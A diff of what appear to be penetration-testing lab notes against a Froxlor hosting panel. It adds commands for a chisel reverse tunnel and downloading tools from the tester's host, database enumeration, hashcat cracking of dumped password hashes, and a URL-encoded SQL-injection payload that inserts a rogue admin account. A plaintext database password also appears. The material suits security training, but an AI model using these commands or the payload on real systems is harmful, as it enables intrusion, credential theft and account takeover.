@@ -129,7 +129,7 @@ db=oscdb, user=oscuser, password=7NVLVTDGJ38HM2TQ
 
 searchsploit -m 51263
 
-chisel server --port 8081 --reverse
+chisel server --port 80 --reverse
 sudo tcpdump -nvvvXi tun0 tcp port 8081
 wget http://192.168.45.160/chisel -O chisel
 
@@ -148,6 +148,30 @@ mysql -u oscuser -D oscdb -h 127.0.0.1 -p
 select * from administrators;
 # find a user (admin) and password hash
 $P$DVNsEBdq7PQdr7GR65xbL0pas6caWx0 
-hashcat -m 0 admin.md5.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+hashid admin.md5.hash # phpass
+hashcat --help | grep 'phpass' # mode 400
+hashcat -m 400 admin.md5.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
+# we need to get into the froxlor DB instead of sscdb to get password hashes
+/etc/mysql/my.cnf
+/etc/mysql/mariadb.cnf 
+/var/www/html/froxlor/.github
+/var/www/html/froxlor/logs
+/var/www/html/froxlor/admin_configfiles.php - says it has mysql password FROXLOR_MYSQL_PASSWORD
+
+# turns out we can just use the same password of the oscdb user as root 
+use froxlor;
+select loginname, password from panel_admins;
+select * from panel_customers;
+$5$b50069d236c187f2$PIeKl3JO.NJ5X0hhtHjmJx9nDtImDP61/x4D8Rv/Gu/ 
+hashid panel.hash # [+] SHA-256 Crypt 
+hashcat --help | grep 'crypt' # 7400 | sha256crypt $5$, SHA256 (Unix)  
+# not able to crack admin password
+hashcat -m 7400 panel.hash /usr/share/wordlists/rockyou.txt
+# able to crack - Christopher
+hashcat -m 7400 flybike.hash /usr/share/wordlists/rockyou.txt
+
+# need to use a different exploit, as the first one requires that you already have the admin creds
+
+s=fdbdf63173d0b332ce13a148476499b2&page=mysqls&action=add&send=send&custom_suffix=%60%3Binsert+into+panel_admins+%28loginname%2Cpassword%2Ccustomers_see_all%2Cdomains_see_all%2Ccaneditphpsettings%2Cchange_serversettings%29+values+%28%27x%27%2C%27%245%24ccd0bcdd9ab970b1%24Hx%2Fa0W8QHwTisNoa1lYCY4s3goJeh.YCQ3hWqH1ZUr8%27%2C1%2C1%2C1%2C1%29%3B--&description=x&mysql_password=claudiatest&mysql_password_suggestion=oyxtjaihgb&sendinfomail=0
 ```
